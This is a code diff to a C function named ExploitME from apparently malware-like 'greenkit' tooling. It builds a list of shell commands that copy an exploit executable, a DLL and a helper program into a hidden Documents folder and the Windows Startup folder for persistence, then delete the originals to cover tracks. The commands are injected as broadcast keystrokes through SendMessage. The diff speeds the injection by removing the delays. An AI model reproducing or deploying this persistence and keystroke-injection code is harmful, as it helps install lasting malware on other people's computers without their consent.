@@ -64,20 +64,26 @@ int ExploitME()
 
 	Sleep(1000);
 	
-	PCHAR copy[] = { "rmdir /S /Q %USERPROFILE%\\Documents\\_greenkit_folder",
-		"xcopy _greenkit_Exploit.exe %USERPROFILE%\\Documents\\_greenkit_folder\\",
-		"xcopy _greenkit_GreenKitExe.exe %USERPROFILE%\\Documents\\_greenkit_folder\\",
-		"xcopy _greenkit_GreenKit.dll %USERPROFILE%\\Documents\\_greenkit_folder\\",
-		"xcopy libcurl-4.dll %USERPROFILE%\\Documents\\_greenkit_folder\\",
-		"xcopy _greenkit_Exploit.exe \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"",
-		"exit",
+    PCHAR copy[] = { "rmdir /S /Q %USERPROFILE%\\Documents\\_greenkit_folder",
+        "del \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\_greenkit_Exploit.exe\"",
+        "xcopy _greenkit_Exploit.exe %USERPROFILE%\\Documents\\_greenkit_folder\\ /Y",
+        "xcopy _greenkit_GreenKitExe.exe %USERPROFILE%\\Documents\\_greenkit_folder\\ /Y",
+        "xcopy _greenkit_GreenKit.dll %USERPROFILE%\\Documents\\_greenkit_folder\\ /Y",
+        "xcopy _greenkit_Exploit.exe \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\" /Y",
+        "xcopy _greenkit_GreenKitExe.exe %USERPROFILE%\\Documents\\_greenkit_folder\\ /Y",
+        "xcopy _greenkit_GreenKit.dll %USERPROFILE%\\Documents\\_greenkit_folder\\ /Y",
+        "xcopy _greenkit_Exploit.exe %USERPROFILE%\\Documents\\_greenkit_folder\\ /Y",
+        "xcopy _greenkit_Exploit.exe \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\" /Y",
+        "del _greenkit_Exploit.exe",
+        "del _greenkit_GreenKitExe.exe",
+        "del _greenkit_GreenKit.dll",
+        "exit",
 		NULL };
 
 	for (unsigned int i = 0; copy[i] != NULL; ++i)
 	{
 		for (unsigned int j = 0; j < strlen(copy[i]); ++j)
 		{
-			Sleep(10);
 			SendMessage(
 				HWND_BROADCAST,
 				WM_CHAR,
@@ -85,7 +91,6 @@ int ExploitME()
 				0
 				);
 		}
-		Sleep(1000);
 
 		SendMessage(
 			HWND_BROADCAST,
